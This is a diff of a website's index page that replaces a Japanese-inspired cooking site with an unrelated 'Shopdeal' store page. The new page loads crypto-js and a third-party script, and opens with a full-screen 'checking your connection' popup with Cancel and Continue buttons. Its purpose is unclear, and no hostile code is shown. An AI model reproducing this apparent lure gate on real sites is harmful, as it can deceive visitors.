@@ -1,175 +1,749 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Edamame Cinder | Japanese-Inspired Recipes, Grilling &amp; Rice Bowls</title>
-<meta name="description" content="Plant-forward Japanese-inspired home cooking: a charcoal grill heat guide, a balanced bowl builder, pantry staples like miso and soy, and easy recipes for edamame, tofu and more.">
-<meta name="robots" content="index, follow, max-image-preview:large">
-<link rel="canonical" href="https://www.edamamecinder.com/">
-<meta property="og:type" content="website"><meta property="og:site_name" content="Edamame Cinder">
-<meta property="og:title" content="Edamame Cinder | Japanese-Inspired Recipes, Grilling &amp; Rice Bowls"><meta property="og:description" content="Plant-forward Japanese-inspired home cooking: a charcoal grill heat guide, a balanced bowl builder, pantry staples like miso and soy, and easy recipes for edamame, tofu and more.">
-<meta property="og:url" content="https://www.edamamecinder.com/"><meta property="og:image" content="https://images.unsplash.com/photo-1621851709622-e19c9a4f0cc5?auto=format&fit=crop&w=1200&q=75">
-<meta name="twitter:card" content="summary_large_image"><meta name="theme-color" content="#1C1C1A">
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 40 40'%3E%3Crect x='1' y='1' width='38' height='38' rx='6' fill='%23E2582B'/%3E%3Cellipse cx='15' cy='20' rx='5' ry='7' fill='%237FA650'/%3E%3Cellipse cx='25' cy='20' rx='5' ry='7' fill='%237FA650'/%3E%3C/svg%3E">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://images.unsplash.com">
-<link href="https://fonts.googleapis.com/css2?family=Shippori+Mincho:wght@600;700&family=Nunito+Sans:wght@400;700;800&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="assets/css/style.css">
-<!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Help0x0x-MDs</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+  <style>
+  
+    :root{
+      --ink:#0b1020;
+      --muted:#64748b;
+      --line:#e9ebf2;
+      --surface:#f8fafc;
+      --brand:#6d28d9;
+      --brand-dark:#5b21b6;
+      --accent:#db2777;
+      --radius:18px;
+      --shadow-sm:0 1px 2px rgba(16,24,40,.06), 0 1px 3px rgba(16,24,40,.08);
+      --shadow-md:0 12px 30px -14px rgba(16,24,40,.22);
+      --shadow-lg:0 28px 60px -24px rgba(16,24,40,.32);
+      --max:1180px;
+    }
+
+    *,*::before,*::after{ box-sizing:border-box; }
+    html{ scroll-behavior:smooth; }
+    body{
+      margin:0;
+      font-family:'Inter',system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+      color:var(--ink);
+      background:#fff;
+      line-height:1.6;
+      -webkit-font-smoothing:antialiased;
+    }
+    img{ max-width:100%; display:block; }
+    a{ color:inherit; text-decoration:none; }
+    button{ font:inherit; }
+    ul{ list-style:none; margin:0; padding:0; }
+
+    .container{ width:min(var(--max), 100% - 48px); margin-inline:auto; }
+
+    /* ============================================================
+       LOADING POPUP
+       ============================================================ */
+    .popup{
+      position:fixed; inset:0; z-index:9999;
+      display:flex; align-items:center; justify-content:center;
+      background:#fff; padding:24px;
+    }
+    .popup-content{
+      width:100%; max-width:560px;
+      text-align:center;
+      animation:popIn .5s cubic-bezier(.2,.8,.3,1) both;
+    }
+    @keyframes popIn{
+      from{ opacity:0; transform:translateY(14px) scale(.98); }
+      to{ opacity:1; transform:none; }
+    }
+    .loading-gif{
+      width:120px; height:120px;
+      margin:0 auto 26px;
+    }
+    .popup-title{
+      font-size:clamp(1.3rem,2.6vw,1.6rem);
+      font-weight:800; letter-spacing:-.025em;
+      margin:0 0 8px;
+    }
+    .popup-content p.sub{
+      margin:0 0 32px;
+      color:var(--muted);
+      font-size:.95rem;
+      font-weight:500;
+    }
+    .buttons{
+      display:flex; justify-content:center; gap:14px; flex-wrap:wrap;
+    }
+    .buttons button{
+      min-width:152px;
+      padding:14px 30px;
+      border:0; border-radius:13px;
+      cursor:pointer; font-weight:700; font-size:1rem;
+      transition:transform .18s ease, box-shadow .18s ease, background .18s ease;
+    }
+    #cancelBtn{ background:#f1f5f9; color:#334155; }
+    #cancelBtn:hover{ background:#e2e8f0; }
+    #continueBtn{
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff;
+      box-shadow:0 16px 30px -14px rgba(109,40,217,.85);
+    }
+    #continueBtn:hover{ transform:translateY(-2px); }
+
+    .hint{
+      background:linear-gradient(90deg,#1e1b4b,#4c1d95 45%,#831843);
+      color:#ede9fe;
+      text-align:center;
+      font-size:.82rem;
+      font-weight:600;
+      letter-spacing:.02em;
+      padding:11px 20px;
+      min-height:42px;
+      display:flex; align-items:center; justify-content:center;
+      gap:10px;
+    }
+
+    .nav{
+      position:sticky; top:0; z-index:80;
+      display:flex; align-items:center; gap:26px;
+      height:72px;
+      padding:0 max(24px, calc((100vw - var(--max)) / 2));
+      background:rgba(255,255,255,.86);
+      backdrop-filter:blur(16px);
+      -webkit-backdrop-filter:blur(16px);
+      border-bottom:1px solid var(--line);
+    }
+    .brand{
+      display:flex; align-items:center; gap:11px;
+      font-weight:800; font-size:1.12rem;
+      letter-spacing:-.025em; white-space:nowrap;
+    }
+    .brand-mark{
+      width:36px; height:36px; flex:none;
+      display:grid; place-items:center;
+      border-radius:11px; font-size:1rem;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      box-shadow:0 10px 22px -10px rgba(109,40,217,.9);
+    }
+
+    .links{ display:flex; gap:6px; }
+    .links a{
+      font-size:.9rem; font-weight:500; color:#4b5563;
+      padding:8px 14px; border-radius:10px;
+      transition:color .18s ease, background .18s ease;
+    }
+    .links a:hover{ color:var(--brand); background:#f5f3ff; }
+
+    .clock{
+      margin-left:auto;
+      display:inline-flex; align-items:center; gap:6px;
+      font-size:.78rem; font-weight:600; color:var(--brand-dark);
+      background:#f5f3ff; border:1px solid #ede9fe;
+      padding:7px 13px; border-radius:999px; white-space:nowrap;
+    }
+    .cart-btn{
+      display:inline-flex; align-items:center; gap:8px;
+      border:0; cursor:pointer;
+      background:var(--ink); color:#fff;
+      font-weight:600; font-size:.88rem;
+      padding:10px 18px; border-radius:999px;
+      transition:transform .18s ease, background .18s ease;
+    }
+    .cart-btn:hover{ background:var(--brand); transform:translateY(-1px); }
+    .cart-btn .badge{
+      background:#fff; color:var(--ink);
+      border-radius:999px; min-width:20px; height:20px;
+      display:grid; place-items:center;
+      padding:0 6px; font-size:.72rem; font-weight:800;
+    }
+
+    @media (max-width:900px){
+      .links{ display:none; }
+      .clock{ display:none; }
+    }
+    @media (max-width:560px){
+      .nav{ gap:14px; height:66px; padding-inline:18px; }
+      .cart-btn{ padding:9px 14px; font-size:.82rem; }
+    }
+
+    /* ============================================================
+       HERO
+       ============================================================ */
+    .hero{
+      display:grid;
+      grid-template-columns:1.03fr .97fr;
+      gap:60px; align-items:center;
+      padding:76px max(24px, calc((100vw - var(--max)) / 2)) 68px;
+      background:
+        radial-gradient(900px 420px at 8% -20%, rgba(109,40,217,.14), transparent 62%),
+        radial-gradient(760px 420px at 98% -6%, rgba(219,39,119,.12), transparent 58%),
+        linear-gradient(180deg,#fbfaff,#fff);
+    }
+    @media (max-width:960px){
+      .hero{ grid-template-columns:1fr; gap:44px; padding-top:52px; padding-bottom:52px; }
+    }
+
+    .eyebrow{
+      display:inline-flex; align-items:center; gap:8px;
+      background:#fff; border:1px solid #ede9fe;
+      color:var(--brand-dark);
+      font-size:.78rem; font-weight:700;
+      letter-spacing:.06em; text-transform:uppercase;
+      padding:7px 15px; border-radius:999px;
+      box-shadow:var(--shadow-sm);
+      margin-bottom:20px;
+    }
+    .eyebrow .dot{
+      width:7px; height:7px; border-radius:50%;
+      background:var(--accent);
+      box-shadow:0 0 0 4px rgba(219,39,119,.16);
+    }
+
+    .hero-text h1{
+      font-size:clamp(2.2rem,5vw,3.4rem);
+      line-height:1.08; letter-spacing:-.035em;
+      font-weight:900; margin:0 0 18px;
+    }
+    .hero-text h1 span{
+      background:linear-gradient(115deg,var(--brand),var(--accent));
+      -webkit-background-clip:text; background-clip:text; color:transparent;
+    }
+    .hero-text p{
+      font-size:1.05rem; color:var(--muted);
+      max-width:490px; margin:0 0 30px;
+    }
+
+    .cta{
+      display:inline-flex; align-items:center; gap:9px;
+      padding:15px 30px; border-radius:999px;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff; font-weight:700; font-size:.95rem;
+      box-shadow:0 16px 32px -16px rgba(109,40,217,.9);
+      transition:transform .18s ease, box-shadow .18s ease;
+    }
+    .cta:hover{ transform:translateY(-2px); box-shadow:0 22px 40px -18px rgba(109,40,217,.95); }
+
+    .hero-stats{
+      display:flex; gap:34px; flex-wrap:wrap;
+      margin-top:40px; padding-top:26px;
+      border-top:1px solid var(--line);
+    }
+    .hero-stats strong{
+      display:block; font-size:1.35rem; font-weight:800; letter-spacing:-.02em;
+    }
+    .hero-stats span{ font-size:.82rem; color:var(--muted); }
+
+    .hero-img{
+      width:100%; aspect-ratio:5/4; object-fit:cover;
+      border-radius:26px;
+      box-shadow:var(--shadow-lg);
+    }
+
+    /* ============================================================
+       TRUST STRIP
+       ============================================================ */
+    .trust{
+      border-block:1px solid var(--line);
+      background:var(--surface);
+    }
+    .trust-grid{
+      display:grid; grid-template-columns:repeat(4,1fr);
+      gap:10px; padding:22px 0;
+    }
+    .trust-item{
+      display:flex; align-items:center; justify-content:center; gap:9px;
+      font-size:.85rem; font-weight:600; color:#475569;
+      padding:6px 10px; border-right:1px solid var(--line);
+    }
+    .trust-item:last-child{ border-right:0; }
+    .trust-item span{ font-size:1.05rem; }
+    @media (max-width:860px){
+      .trust-grid{ grid-template-columns:repeat(2,1fr); gap:14px; }
+      .trust-item{ border-right:0; justify-content:flex-start; }
+    }
+
+    /* ============================================================
+       SECTIONS
+       ============================================================ */
+    .section{ padding:76px 0; }
+    .section-head{ text-align:center; max-width:640px; margin:0 auto 42px; }
+    .section-head .kicker{
+      display:inline-block;
+      font-size:.76rem; font-weight:800;
+      letter-spacing:.12em; text-transform:uppercase;
+      color:var(--brand); margin-bottom:10px;
+    }
+    .section-head h2{
+      font-size:clamp(1.6rem,3.2vw,2.2rem);
+      font-weight:900; letter-spacing:-.03em;
+      margin:0 0 10px; line-height:1.15;
+    }
+    .section-head p{ margin:0; color:var(--muted); font-size:.97rem; }
+
+
+    .grid{
+      display:grid; gap:24px;
+      grid-template-columns:repeat(auto-fill,minmax(250px,1fr));
+    }
+    .card{
+      display:flex; flex-direction:column;
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius); overflow:hidden;
+      transition:transform .22s ease, box-shadow .22s ease, border-color .22s ease;
+    }
+    .card:hover{
+      transform:translateY(-6px);
+      box-shadow:var(--shadow-lg);
+      border-color:transparent;
+    }
+    .card-media{
+      position:relative; aspect-ratio:4/3;
+      overflow:hidden; background:#f1f5f9;
+    }
+    .card-media img{
+      width:100%; height:100%; object-fit:cover;
+      transition:transform .55s cubic-bezier(.2,.7,.3,1);
+    }
+    .card:hover .card-media img{ transform:scale(1.07); }
+
+    .card .badge{
+      position:absolute; top:12px; left:12px;
+      font-size:.68rem; font-weight:800; letter-spacing:.06em;
+      text-transform:uppercase; color:#fff;
+      padding:6px 11px; border-radius:999px;
+      background:var(--ink);
+    }
+    .card .badge--sale{ background:var(--accent); }
+    .card .badge--new{ background:#0ea5e9; }
+
+    .card .body{
+      padding:16px 18px 18px;
+      display:flex; flex-direction:column; flex:1;
+    }
+    .card .cat{
+      font-size:.7rem; font-weight:700; letter-spacing:.1em;
+      text-transform:uppercase; color:#94a3b8; margin-bottom:6px;
+    }
+    .card h3{
+      margin:0 0 8px; font-size:1rem; font-weight:700; letter-spacing:-.015em;
+    }
+    .price-row{
+      display:flex; align-items:baseline; gap:8px;
+      margin-top:auto; padding-top:6px;
+    }
+    .card .price{
+      font-size:1.12rem; font-weight:800;
+      letter-spacing:-.02em; color:var(--ink);
+    }
+    .card .old{
+      font-size:.85rem; color:#a3aab8;
+      text-decoration:line-through; font-weight:500;
+      margin:0;
+    }
+    .save{
+      margin-left:auto;
+      font-size:.7rem; font-weight:800;
+      color:#047857; background:#ecfdf5;
+      padding:3px 8px; border-radius:999px;
+    }
+
+    .add{
+      margin-top:14px; width:100%;
+      display:inline-flex; align-items:center; justify-content:center; gap:8px;
+      border:1px solid var(--ink); background:#fff; color:var(--ink);
+      font-weight:700; font-size:.88rem;
+      padding:11px; border-radius:11px; cursor:pointer;
+      transition:background .2s ease, color .2s ease, transform .18s ease;
+    }
+    .add:hover{ background:var(--ink); color:#fff; transform:translateY(-1px); }
+    .add:active{ transform:translateY(0); }
+
+  
+    .about{
+      background:var(--surface);
+      border-block:1px solid var(--line);
+    }
+    .features{
+      display:grid; gap:22px;
+      grid-template-columns:repeat(auto-fit,minmax(210px,1fr));
+    }
+    .feature{
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius);
+      padding:28px 24px;
+      text-align:left;
+      transition:transform .22s ease, box-shadow .22s ease;
+    }
+    .feature:hover{ transform:translateY(-4px); box-shadow:var(--shadow-md); }
+    .feature span{
+      display:grid; place-items:center;
+      width:48px; height:48px;
+      border-radius:14px; font-size:1.3rem;
+      background:linear-gradient(135deg,#f5f3ff,#fdf2f8);
+      border:1px solid #ede9fe;
+      margin-bottom:16px;
+    }
+    .feature h3{ margin:0 0 6px; font-size:1rem; font-weight:800; letter-spacing:-.015em; }
+    .feature p{ margin:0; color:var(--muted); font-size:.87rem; line-height:1.55; }
+
+    /* ============================================================
+       FOOTER
+       ============================================================ */
+    .footer{
+      background:#0b1020;
+      color:#94a3b8;
+      text-align:center;
+      padding:44px 24px;
+      font-size:.85rem;
+    }
+    .footer .fbrand{
+      display:inline-flex; align-items:center; gap:10px;
+      color:#fff; font-weight:800; font-size:1rem;
+      letter-spacing:-.02em; margin-bottom:10px;
+    }
+    .footer p{ margin:0 0 6px; }
+    .footer small{ color:#64748b; font-size:.78rem; }
+
+  
+    @media (prefers-reduced-motion:reduce){
+      *{ animation-duration:.001ms !important; transition-duration:.001ms !important; }
+      html{ scroll-behavior:auto; }
+    }
+  </style>
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-0LY0HY7L01');
+  </script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
 <script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-  gtag('config', 'G-0LY0HY7L01');
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
 </script>
-<script type="application/ld+json">[{"@context": "https://schema.org", "@type": "Organization", "name": "Edamame Cinder", "url": "https://www.edamamecinder.com/", "email": "hello@edamamecinder.com", "telephone": "+1-888-777-5845", "address": {"@type": "PostalAddress", "streetAddress": "181 Mercer Street", "addressLocality": "New York", "addressRegion": "NY", "postalCode": "10012", "addressCountry": "US"}}, {"@context": "https://schema.org", "@type": "FAQPage", "mainEntity": [{"@type": "Question", "name": "What is edamame?", "acceptedAnswer": {"@type": "Answer", "text": "Edamame are young, green soybeans harvested before they mature. They are usually boiled, steamed or grilled in their pods and seasoned with salt. Only the beans inside are eaten; the tough pods are discarded."}}, {"@type": "Question", "name": "Is edamame good on the grill?", "acceptedAnswer": {"@type": "Answer", "text": "Yes. Grilling the pods over high heat blisters and chars them, adding a smoky flavour. A grill basket or perforated tray stops them falling through the grate."}}, {"@type": "Question", "name": "Do I need a charcoal grill for these recipes?", "acceptedAnswer": {"@type": "Answer", "text": "No. A gas grill, stovetop griddle pan or oven grill works for every recipe. Charcoal simply adds extra smokiness."}}, {"@type": "Question", "name": "What is umami?", "acceptedAnswer": {"@type": "Answer", "text": "Umami is the savoury taste found in foods such as miso, soy sauce, mushrooms, seaweed and ripe tomatoes. Balancing it with acidity and freshness makes dishes taste rounded."}}, {"@type": "Question", "name": "Are your recipes vegetarian?", "acceptedAnswer": {"@type": "Answer", "text": "Most are plant-forward, and many are fully vegetarian or vegan. A few include fish or eggs. Each recipe is clearly labelled, and we suggest swaps where possible."}}, {"@type": "Question", "name": "Is Edamame Cinder a restaurant?", "acceptedAnswer": {"@type": "Answer", "text": "No. Edamame Cinder is an independent home-cooking website. We publish recipes and guides; we do not operate a restaurant, sell food or take orders."}}]}]</script>
+
+
 </head>
 <body>
-<a class="skip" href="#main">Skip to content</a>
-<header class="hdr">
-  <div class="wrap">
-    <a class="logo" href="index.html" aria-label="Edamame Cinder home"><svg class="stamp" viewBox="0 0 40 40" aria-hidden="true"><rect x="1" y="1" width="38" height="38" rx="6" fill="#E2582B"/><ellipse cx="15" cy="20" rx="5" ry="7" fill="#7FA650" transform="rotate(-20 15 20)"/><ellipse cx="25" cy="20" rx="5" ry="7" fill="#7FA650" transform="rotate(20 25 20)"/><path d="M8 32 Q20 26 32 32" fill="none" stroke="#1C1C1A" stroke-width="2.2" stroke-linecap="round"/></svg><span><b>Edamame Cinder</b><small>GREENS &middot; GRAINS &middot; GRILL</small></span></a>
-    <nav id="nav" aria-label="Main navigation"><ul class="nav"><li><a href="index.html" aria-current="page">Home</a></li><li><a href="recipes.html">Recipes</a></li><li><a href="pantry-guide.html">Pantry &amp; Grill Guide</a></li><li><a href="about.html">About</a></li><li><a href="contact.html">Contact</a></li></ul></nav>
-    <button class="burger" aria-label="Open menu" aria-expanded="false" aria-controls="nav"><span></span><span></span><span></span></button>
-  </div>
-</header>
-<main id="main">
-<section class="hero">
-  <div class="wrap">
-    <div class="vert" aria-hidden="true">Greens &middot; Grains &middot; Grill</div>
-    <div>
-      <span class="kick" style="color:var(--ember-lt)">Japanese-inspired home cooking</span>
-      <h1>Bright greens, <span>gentle smoke</span>, simple bowls.</h1>
-      <p class="lead">Edamame Cinder shares plant-forward recipes inspired by Japanese home kitchens and the charcoal grill: blistered edamame, glazed mushrooms, comforting rice bowls and the pantry staples that tie them together.</p>
-      <div class="ctas"><a class="btn" href="#grill">Grill heat guide</a><a class="btn btn--line" href="recipes.html">Browse recipes</a></div>
-    </div>
-    <div class="hero-pics">
-      <div class="a pic"><img src="https://images.unsplash.com/photo-1621851709622-e19c9a4f0cc5?auto=format&fit=crop&w=900&q=75" alt="burning charcoal glowing in a grill" width="900" height="900" fetchpriority="high"></div>
-      <div class="b pic"><img src="https://images.unsplash.com/photo-1649257171206-37625b1f3b2f?auto=format&fit=crop&w=400&q=75" alt="pile of green edamame pods" width="400" height="400"></div>
-      <div class="seal">Blistered edamame, flaky salt, a squeeze of lime.</div>
-    </div>
-  </div>
-</section>
-<section class="shun" id="shun" aria-label="In season this month">
-  <div class="wrap">
-    <div class="m"><small>In season</small><span class="mm">October</span></div>
-    <div><p>Cooking with the seasons brings out the best flavour. Look for these at markets this month:</p><ul><li>Mushrooms</li><li>Squash</li><li>Sweet potato</li><li>Apples</li></ul></div>
-  </div>
-</section>
 
-<section class="sec dark" id="grill" aria-labelledby="gr-t">
-  <div class="wrap">
-    <div class="sec-head"><div><span class="kick">Grill heat guide</span><h2 id="gr-t">How hot, how long?</h2></div><p class="muted">Most charcoal grills have hot, medium and cooler zones. Choose an ingredient to see which zone suits it, how long it takes and a tip for the best result.</p></div>
-    <div class="grill">
-      <div class="ilist" role="group" aria-label="Choose an ingredient"><button type="button" data-g="eda" aria-pressed="true"><img src="https://images.unsplash.com/photo-1557621956-ce58555aa0ce?auto=format&fit=crop&w=160&q=75" alt="green edamame beans in a bowl" width="52" height="52" loading="lazy">Edamame</button><button type="button" data-g="corn" aria-pressed="false"><img src="https://images.unsplash.com/photo-1653886764100-60e01f57bd1d?auto=format&fit=crop&w=160&q=75" alt="corn on the cob cooking on a grill" width="52" height="52" loading="lazy">Sweetcorn</button><button type="button" data-g="shii" aria-pressed="false"><img src="https://images.unsplash.com/photo-1755108906864-fdaadb8ab5f1?auto=format&fit=crop&w=160&q=75" alt="pile of fresh shiitake mushrooms" width="52" height="52" loading="lazy">Shiitake</button><button type="button" data-g="aub" aria-pressed="false"><img src="https://images.unsplash.com/photo-1677889173788-57b871df7b8a?auto=format&fit=crop&w=160&q=75" alt="plate of grilled aubergine" width="52" height="52" loading="lazy">Aubergine</button><button type="button" data-g="tofu" aria-pressed="false"><img src="https://images.unsplash.com/photo-1722635940350-d1b2e5129379?auto=format&fit=crop&w=160&q=75" alt="cubes of tofu on a cutting board" width="52" height="52" loading="lazy">Tofu</button><button type="button" data-g="salmon" aria-pressed="false"><img src="https://images.unsplash.com/photo-1695882257873-4a4ad25b8c7c?auto=format&fit=crop&w=160&q=75" alt="salmon grilling next to mushrooms" width="52" height="52" loading="lazy">Salmon</button></div>
-      <div class="gout" aria-live="polite">
-        <h3 id="g-name">Edamame in the pod</h3>
-        <div class="zones" aria-label="Heat zone"><div data-z="high">HIGH</div><div data-z="med">MEDIUM</div><div data-z="low">LOW</div></div>
-        <dl class="gfacts"><div><dt>Time</dt><dd id="g-time">4&ndash;6 min</dd></div><div><dt>Method</dt><dd id="g-how">Grill basket or foil tray</dd></div></dl>
-        <p id="g-tip" style="margin:0">Toss pods with oil and salt, grill until blistered, then finish with flaky salt and a squeeze of lime.</p>
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <h2 class="popup-title">Loading... Please wait.</h2>
+      <p class="sub">We're checking your connection.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
       </div>
     </div>
   </div>
-</section>
+  
+  <div id="shop">
+    <div class="hint">🛍️ Shopdeal — Summer Sale is live · Up to 50% off</div>
 
-<section class="sec" id="bowl-sec" aria-labelledby="bw-t">
-  <div class="wrap">
-    <div class="sec-head"><div><span class="kick g">Bowl builder</span><h2 id="bw-t">Build a balanced bowl</h2></div><p class="muted">Great bowls balance savoury umami with saltiness, a little sweetness, acidity and fresh crunch. Mix and match to see how your combination tastes on paper.</p></div>
-    <div class="bowl">
-      <form id="bowlf" onsubmit="return false">
-        <fieldset class="fld"><legend>Base</legend><div class="pick"><label><input type="radio" name="base" value="rice" checked><span>Steamed rice</span></label><label><input type="radio" name="base" value="soba"><span>Soba noodles</span></label><label><input type="radio" name="base" value="greens"><span>Leafy greens</span></label></div></fieldset>
-        <fieldset class="fld"><legend>Protein</legend><div class="pick"><label><input type="radio" name="pro" value="tofu" checked><span>Grilled tofu</span></label><label><input type="radio" name="pro" value="edamame"><span>Edamame</span></label><label><input type="radio" name="pro" value="salmon"><span>Charred salmon</span></label><label><input type="radio" name="pro" value="egg"><span>Soft egg</span></label></div></fieldset>
-        <fieldset class="fld"><legend>Sauce</legend><div class="pick"><label><input type="radio" name="sauce" value="miso" checked><span>Miso glaze</span></label><label><input type="radio" name="sauce" value="ponzu"><span>Citrus ponzu</span></label><label><input type="radio" name="sauce" value="sesame"><span>Sesame dressing</span></label><label><input type="radio" name="sauce" value="ginger"><span>Ginger-scallion</span></label></div></fieldset>
-        <fieldset class="fld" style="margin:0"><legend>Toppings</legend><div class="pick"><label><input type="checkbox" name="top" value="scallion" checked><span>Scallions</span></label><label><input type="checkbox" name="top" value="nori"><span>Nori</span></label><label><input type="checkbox" name="top" value="pickle"><span>Quick pickles</span></label><label><input type="checkbox" name="top" value="chili"><span>Chilli crisp</span></label></div></fieldset>
-      </form>
-      <div class="bres" aria-live="polite">
-        <div class="pic"><img src="https://images.unsplash.com/photo-1516684732162-798a0062be99?auto=format&fit=crop&w=800&q=75" alt="rice with sesame seeds in a black bowl" width="800" height="600" loading="lazy"></div>
-        <div class="t">
-          <span class="kick">Your bowl</span>
-          <h3 id="b-name">Grilled tofu &amp; rice with miso glaze</h3>
-          <div class="fbar u" data-f="u"><span>Umami</span><div class="bar"><i style="width:60%"></i></div></div>
-          <div class="fbar s" data-f="s"><span>Salty</span><div class="bar"><i style="width:40%"></i></div></div>
-          <div class="fbar a" data-f="w"><span>Sweet</span><div class="bar"><i style="width:40%"></i></div></div>
-          <div class="fbar" data-f="a"><span>Acidity</span><div class="bar"><i style="width:10%"></i></div></div>
-          <div class="fbar" data-f="f"><span>Fresh</span><div class="bar"><i style="width:25%"></i></div></div>
-          <p id="b-tip" class="muted" style="margin:12px 0 0">Add pickles or a squeeze of citrus to brighten it.</p>
+    <header class="nav">
+      <div class="brand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
+
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <span class="eyebrow"><span class="dot"></span> Summer Sale · Up to 50% Off</span>
+        <h1>Everyday essentials, <span>beautifully priced.</span></h1>
+        <p>Trendy products, free stock photos, all on a single page. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now →</a>
+
+        <div class="hero-stats">
+          <div><strong>12,480+</strong><span>Happy customers</span></div>
+          <div><strong>4.9 / 5</strong><span>Average rating</span></div>
+          <div><strong>48 hrs</strong><span>US delivery</span></div>
         </div>
       </div>
-    </div>
-  </div>
-</section>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/900/720" alt="hero" />
+    </section>
 
-<section class="sec paper" aria-labelledby="pn-t">
-  <div class="wrap">
-    <div class="sec-head"><div><span class="kick">The pantry</span><h2 id="pn-t">Six staples, endless dinners</h2></div><p class="muted">With these six ingredients in the cupboard, a bowl of rice and a handful of vegetables become a satisfying meal in minutes.</p></div>
-    <div class="pantry"><article class="tile"><div class="pic"><img src="https://images.unsplash.com/photo-1499126167718-c87f5c1387e8?auto=format&fit=crop&w=300&q=75" alt="dark soy sauce dripping from a small dish" width="300" height="300" loading="lazy"></div><div class="t"><h3>Soy sauce</h3><p>Salty, savoury backbone of most marinades and glazes. Choose naturally brewed for the best flavour.</p></div></article><article class="tile"><div class="pic"><img src="https://images.unsplash.com/photo-1763470260582-894ae15f43bb?auto=format&fit=crop&w=300&q=75" alt="bowl of miso soup with tofu and seaweed" width="300" height="300" loading="lazy"></div><div class="t"><h3>Miso</h3><p>Fermented soybean paste. White miso is mild and sweet; red miso is deeper and saltier.</p></div></article><article class="tile"><div class="pic"><img src="https://images.unsplash.com/photo-1630623093145-f606591c2546?auto=format&fit=crop&w=300&q=75" alt="ginger root on a white surface" width="300" height="300" loading="lazy"></div><div class="t"><h3>Fresh ginger</h3><p>Grated into dressings, sauces and marinades for warmth and brightness.</p></div></article><article class="tile"><div class="pic"><img src="https://images.unsplash.com/photo-1788997295075-69d15c0b6772?auto=format&fit=crop&w=300&q=75" alt="backlit sheet of roasted seaweed" width="300" height="300" loading="lazy"></div><div class="t"><h3>Nori</h3><p>Toasted seaweed sheets for rice balls and bowls, or crumbled over as a savoury topping.</p></div></article><article class="tile"><div class="pic"><img src="https://images.unsplash.com/photo-1644131447497-8723db691320?auto=format&fit=crop&w=300&q=75" alt="bowl of white rice with black sesame seeds" width="300" height="300" loading="lazy"></div><div class="t"><h3>Sesame</h3><p>Toasted seeds and sesame oil add nutty depth; a few drops of oil go a long way.</p></div></article><article class="tile"><div class="pic"><img src="https://images.unsplash.com/photo-1589698272390-0501a07619bb?auto=format&fit=crop&w=300&q=75" alt="bamboo whisk mixing green matcha tea" width="300" height="300" loading="lazy"></div><div class="t"><h3>Matcha</h3><p>Stone-ground green tea powder for drinks, desserts and a gentle savoury salt.</p></div></article></div>
-    <p style="margin-top:26px"><a class="btn btn--coal" href="pantry-guide.html">Read the full pantry guide</a></p>
-  </div>
-</section>
+    <!-- Histats.com  START  (aync)-->
+   <!--  <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript> -->
+    <!-- Histats.com  END  -->
 
-<section class="band" aria-labelledby="em-t">
-  <img src="https://images.unsplash.com/photo-1748362885463-a19be2920f88?auto=format&fit=crop&w=1800&q=75" alt="glowing embers and flames in a fire" width="1800" height="1200" loading="lazy">
-  <div class="wrap">
-    <span class="kick" style="color:var(--ember-lt)">Cooking over embers</span>
-    <h2 id="em-t">Four rules for the charcoal grill</h2>
-    <p>The best grilling happens over glowing embers, not leaping flames. Patience at the start rewards you with steady, even heat.</p>
-    <ol class="rules">
